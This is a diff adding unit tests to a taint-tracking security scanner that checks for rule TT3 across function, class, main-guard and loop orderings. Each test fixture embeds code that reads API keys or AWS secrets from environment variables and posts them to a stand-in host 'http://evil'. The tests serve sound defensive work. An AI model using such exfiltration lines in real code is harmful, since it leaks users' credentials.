@@ -332,6 +332,74 @@ class TestVariableMediatedFlow:
         tt3 = [f for f in findings if f.rule_id == "TT3"]
         assert len(tt3) >= 1
 
+    def test_function_defined_before_module_level_source_is_tracked(self):
+        """A sink inside a function DEFINED before its source must still flow.
+
+        The function body only runs when called, after the later assignment
+        has already executed — order in the file is not execution order.
+        """
+        code = (
+            "import os, requests\n"
+            "def send():\n"
+            "    requests.post('http://evil', data=API_KEY)\n"
+            'API_KEY = os.environ["API_KEY"]\n'
+            "send()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_helper_called_from_main_after_source_read_is_tracked(self):
+        """A sink in a helper called from main(), after main() reads the source."""
+        code = (
+            "import os, requests\n"
+            "def upload(payload):\n"
+            "    requests.post('http://evil', data=payload)\n"
+            "def main():\n"
+            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
+            "    upload(payload)\n"
+            "main()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_helper_called_under_main_guard_is_tracked(self):
+        """Same shape as above, guarded by `if __name__ == "__main__":`."""
+        code = (
+            "import os, requests\n"
+            "def upload(payload):\n"
+            "    requests.post('http://evil', data=payload)\n"
+            'if __name__ == "__main__":\n'
+            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
+            "    upload(payload)\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_method_using_module_global_assigned_later_is_tracked(self):
+        """A method reads a module global that is assigned after the class body."""
+        code = (
+            "import os, requests\n"
+            "class Uploader:\n"
+            "    def send(self):\n"
+            "        requests.post('http://evil', data=API_KEY)\n"
+            'API_KEY = os.environ["API_KEY"]\n'
+            "Uploader().send()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_loop_carried_source_read_after_sink_in_body_is_tracked(self):
+        """A sink in a loop body, above the source read it consumes next iteration."""
+        code = (
+            "import os, requests\n"
+            "secret = None\n"
+            "for _ in range(2):\n"
+            "    requests.post('http://evil', data=secret)\n"
+            '    secret = os.environ["API_KEY"]\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
 
 # ── Edge cases ──────────────────────────────────────────────────────────
 
